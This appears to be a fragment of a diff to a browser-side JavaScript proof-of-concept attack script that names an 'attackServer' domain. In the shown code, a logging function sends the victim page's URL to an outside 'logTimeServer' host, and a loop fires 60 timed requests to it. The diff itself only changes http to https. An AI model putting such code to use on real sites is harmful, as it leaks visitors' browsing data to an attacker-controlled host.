@@ -12,7 +12,7 @@ var attackServer = 'cryptokryptonite.xyz';
 
 function log(data) {
     var sreq = new XMLHttpRequest();
-    sreq.open('GET', 'http://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
+    sreq.open('GET', 'https://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
     sreq.send();
 }
 
@@ -37,7 +37,7 @@ log('Triggered in ' + window.location.href);
 for(var i = 0; i < 60; ++i) {
     log('Loop ' + i);
     var req = new XMLHttpRequest();
-    req.open('GET', 'http://' + logTimeServer + '/', false);
+    req.open('GET', 'https://' + logTimeServer + '/', false);
     req.send();
 }
 
